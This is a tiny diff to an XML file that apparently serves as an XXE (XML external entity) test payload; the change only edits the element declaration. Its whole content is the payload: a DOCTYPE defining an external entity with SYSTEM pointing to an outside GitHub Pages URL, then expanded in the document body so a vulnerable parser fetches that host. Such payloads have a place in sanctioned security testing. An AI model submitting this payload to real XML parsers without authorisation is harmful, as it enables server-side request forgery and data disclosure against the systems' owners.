@@ -1,4 +1,4 @@
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
-<!ELEMENT foo (#ANY)>
+<!ELEMENT foo (#ANY)*>
 <!ENTITY xxe SYSTEM "https://naglinagli.github.io/DoD_Idor">]><foo>&xxe;</foo>
